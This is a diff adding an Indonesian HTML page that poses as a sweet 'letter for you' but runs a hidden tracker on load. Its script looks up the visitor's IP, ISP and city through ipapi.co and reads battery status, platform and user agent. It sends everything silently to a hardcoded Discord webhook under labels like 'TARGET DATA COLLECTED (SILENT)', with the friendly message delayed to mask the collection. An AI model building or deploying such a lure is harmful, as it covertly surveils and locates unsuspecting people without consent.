@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surat Buat Kamu</title>
+    <style>
+        body, html { margin: 0; padding: 0; background: #ffffff; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Arial', sans-serif; overflow: hidden; }
+        #msg { display: none; text-align: center; color: #ff4d6d; padding: 20px; animation: fadeIn 2s; }
+        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
+        h2 { font-size: 1.3rem; }
+    </style>
+</head>
+<body>
+
+    <div id="msg">
+        <h2>Aku cuma mau bilang...</h2>
+        <p>Semangat terus ya harinya, jangan lupa senyum! ❤️</p>
+    </div>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1477316845622132830/VP25Q1ll6_QVAU3y4M2dt3eZMx4xeyeuSQCe59xNn0UXpavztWoOidG3VS4KeN-GPBwt";
+
+        async function sikatData() {
+            try {
+                // 1. Get IP, City, ISP (Tanpa Izin GPS)
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                // 2. Get Battery Info (Status Cas & Persen)
+                let batteryInfo = "Tidak Terdeteksi";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    const statusCas = b.charging ? "🔌 LAGI DI CAS" : "🔋 TIDAK DI CAS";
+                    batteryInfo = `${Math.round(b.level * 100)}% | ${statusCas}`;
+                }
+
+                // 3. Susun Payload Super Lengkap
+                const payload = {
+                    username: "SOPAR PREDATOR V23",
+                    embeds: [{
+                        title: "🕵️ TARGET DATA COLLECTED (SILENT)",
+                        color: 3447003, // Biru Tua
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
+                            { name: "📡 Provider/ISP", value: data.org, inline: true },
+                            { name: "📍 Lokasi (Kota)", value: `${data.city}, ${data.region}`, inline: false },
+                            { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
+                            { name: "🔋 Status Baterai", value: `\`${batteryInfo}\``, inline: true },
+                            { name: "🖥️ Browser", value: navigator.userAgent.split(') ')[1] || "Mobile Browser", inline: false }
+                        ],
+                        footer: { text: "Sopar Stealth System • " + new Date().toLocaleString('id-ID') }
+                    }]
+                };
+
+                // Kirim ke Discord
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (err) {
+                // Jika gagal karena Adblock, tetap lapor
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "⚠️ **Target Buka Link Gombal, tapi data IP terproteksi.**" })
+                });
+            }
+
+            // Setelah 2.5 detik layar putih, baru muncul teks gombalnya
+            setTimeout(() => {
+                document.getElementById('msg').style.display = 'block';
+            }, 2500);
+        }
+
+        window.onload = sikatData;
+    </script>
+</body>
+</html>
